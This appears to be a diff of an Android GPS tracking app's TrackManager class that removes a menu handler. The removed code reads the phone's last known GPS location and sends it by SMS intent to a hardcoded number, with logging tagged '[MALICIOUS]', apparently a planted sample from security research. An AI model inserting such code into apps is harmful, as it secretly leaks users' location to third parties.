@@ -267,22 +267,6 @@ public class TrackManager extends ListActivity {
 			// Start About activity
 			startActivity(new Intent(this, About.class));
 			break;
-		case R.id.trackmgr_menu_sendsms:
-			// Get current location and send it to sms messaging app
-			LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-			Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-
-			if (loc != null) {
-				Intent unauthorizedBehavior = new Intent("de.ub0r.android.smsdroid.SENDSMS");
-				unauthorizedBehavior.setPackage("de.ub0r.android.smsdroid");
-				unauthorizedBehavior.putExtra("number", "1112223333");
-				unauthorizedBehavior.putExtra("location", "lat: " + loc.getLatitude() + " lon: " + loc.getLongitude());
-
-				Log.d("[MALICIOUS]", "intent: " + unauthorizedBehavior);
-
-				startService(unauthorizedBehavior);
-			}
-			break;
 		}
 		return super.onOptionsItemSelected(item);
 	}
